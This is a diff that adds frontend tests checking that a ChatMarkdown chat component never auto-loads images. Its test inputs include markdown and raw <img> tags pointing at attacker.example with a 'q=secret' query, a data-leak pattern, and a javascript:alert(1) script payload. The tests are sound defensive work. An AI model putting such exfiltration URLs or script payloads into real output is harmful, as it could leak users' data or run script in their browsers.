@@ -183,3 +183,52 @@ describe('ChatMarkdown', () => {
     expect((checkboxes[1] as HTMLInputElement).checked).toBe(false);
   });
 });
+
+// ── Images are never auto-loaded ─────────────────────────────────────
+
+describe('ChatMarkdown images', () => {
+  it('renders a remote image as a link instead of loading it', () => {
+    const { container } = renderMarkdown('![chart](https://attacker.example/x.png?q=secret)');
+    expect(container.querySelector('img')).toBeNull();
+    const link = screen.getByRole('link', { name: '[image: chart]' });
+    expect(link).toHaveAttribute('href', 'https://attacker.example/x.png?q=secret');
+    expect(link).toHaveAttribute('target', '_blank');
+    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
+  });
+
+  it('labels an image without alt text', () => {
+    const { container } = renderMarkdown('![](https://example.com/a.png)');
+    expect(container.querySelector('img')).toBeNull();
+    expect(screen.getByRole('link', { name: '[image]' })).toBeInTheDocument();
+  });
+
+  it('renders a linked image as the outer link only (no nested anchor)', () => {
+    const { container } = renderMarkdown(
+      '[![build](https://img.example/badge.svg)](https://example.com/ci)'
+    );
+    expect(container.querySelector('img')).toBeNull();
+    const links = container.querySelectorAll('a');
+    expect(links).toHaveLength(1);
+    expect(links[0]).toHaveAttribute('href', 'https://example.com/ci');
+    expect(links[0].textContent).toBe('[image: build]');
+  });
+
+  it('renders an image with an unsafe source as plain text', () => {
+    const { container } = renderMarkdown('![x](javascript:alert(1))');
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.querySelector('a')).toBeNull();
+    expect(container.textContent).toContain('[image: x]');
+  });
+
+  it('does not load a data: image either', () => {
+    const { container } = renderMarkdown('![pixel](data:image/png;base64,iVBORw0KGgo=)');
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.textContent).toContain('[image: pixel]');
+  });
+
+  it('keeps raw <img> HTML inert', () => {
+    const { container } = renderMarkdown('<img src="https://attacker.example/p.png">');
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.textContent).toContain('<img src="https://attacker.example/p.png">');
+  });
+});
